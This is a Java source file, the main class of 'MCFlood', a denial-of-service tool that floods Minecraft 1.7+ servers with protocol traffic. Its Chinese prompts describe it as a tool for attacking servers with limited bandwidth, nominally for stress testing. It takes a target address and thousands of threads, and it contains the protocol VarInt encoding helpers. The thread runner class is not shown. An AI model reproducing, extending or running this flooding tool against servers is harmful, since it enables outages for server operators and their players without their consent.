package me.xiaozhangup.mcflood;

import com.google.gson.JsonElement;
import com.google.gson.JsonParser;

import java.io.*;
import java.net.Socket;
import java.util.Scanner;

public class MCFlood {
    public static long data = 0;
    public static String[] part1;
    public static long killT = 0;
    public static long point = 0;
    public static String text = "";
    public static int port;

    public static boolean fastmode = false;

    public static void main(String[] args) {

        Scanner s = new Scanner(System.in);

        System.out.println("基于原MCDrink修改优化而来的MCFlood,主用于攻击宽带资源不够充裕的服务器");
        System.out.println("原作者:Mr.cacti,原Github:https://github.com/greyCloudTeam/MCDrink,原作者QQ:3102733279");
        System.out.println("本软件利用mc的协议,快速攻击mc1.7及以上的版本的服务器(因为1.7以下版本的服务器协议可能不一样),达到压测的目的");
        System.out.println(" ");
        System.out.println("在启动命令后面依次加上 服务器IP,线程数量,干扰字符即可快速开始攻击");
        System.out.println("例如: java -jar MCFlood-1.0-SNAPSHOT.jar 127.0.0.1:25565 7000 attack");
        System.out.println(" ");
        if (args.length == 3 && args[0] != null && args[1] != null && args[2] != null) {
            fastmode = true;
            String ip = args[0];
            MCFlood.part1 = ip.split(":");
            MCFlood.port = Integer.parseInt(part1[1]);
            String threadNum = args[1];
            int num = Integer.parseInt(threadNum);
            text = args[2];

            Runner.loadThread(num, s);
        } else {
            System.out.print("请输入服务器完整地址(如127.0.0.1:25565):");
            String ip = s.nextLine();
            System.out.print("请输入线程数量(看cpu，1000以上效果最好):");
            String threadNum = s.nextLine();
            MCFlood.part1 = ip.split(":");
            MCFlood.port = Integer.parseInt(part1[1]);
            int num = Integer.parseInt(threadNum);
            System.out.print("请输入干扰字符，随便几个英文或数字就可以，但是不要太多，不能是中文！:");
            text = s.nextLine();
            System.out.println("正在存入缓存");

            Runner.loadThread(num, s);
        }

    }

    public static int readVarInt(DataInputStream in) throws IOException {
        int i = 0;
        int j = 0;
        while (true) {
            int k = in.readByte();
            i |= (k & 0x7F) << j++ * 7;
            if (j > 5) throw new RuntimeException("VarInt too big");
            if ((k & 0x80) != 128) break;
        }
        return i;
    }

    public static void writeVarInt(DataOutputStream out, int paramInt) throws IOException {
        while (true) {
            if ((paramInt & 0xFFFFFF80) == 0) {
                out.writeByte(paramInt);
                return;
            }
            out.writeByte(paramInt & 0x7F | 0x80);
            paramInt >>>= 7;
        }
    }
}

